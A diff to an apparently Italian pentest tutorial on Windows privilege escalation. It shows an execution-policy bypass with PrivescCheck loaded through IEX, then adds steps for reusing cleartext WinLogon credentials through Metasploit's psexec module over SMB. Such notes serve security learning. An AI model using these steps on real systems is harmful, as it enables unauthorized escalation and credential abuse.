@@ -39,4 +39,11 @@ set-ExecutionPolicy Bypass -scope process -Force
 Get-Content .\PrivescCheck.ps1 | Out-String | IEX
 Invoke-PrivescCheck
 ```
-Otterremo cosí numerose informazioni sul sistema che potremmo sfruttare per elevare i nostri privilegi. 
+Otterremo cosí numerose informazioni sul sistema che potremmo sfruttare per elevare i nostri privilegi. <br> 
+Se dovessimo trovare una vulnerabilitá nelle credenziali di WinLogon, essere verranno mostrate in chiaro e quindi possiamo usarle per poter elevare i nostri privilegi inserendole su PsExec e collegarci al sistema target via smb. 
+```bash
+use exploit/windows/smb/psexec
+set USERNAME <user>
+set PASSWORD <password>
+run
+```
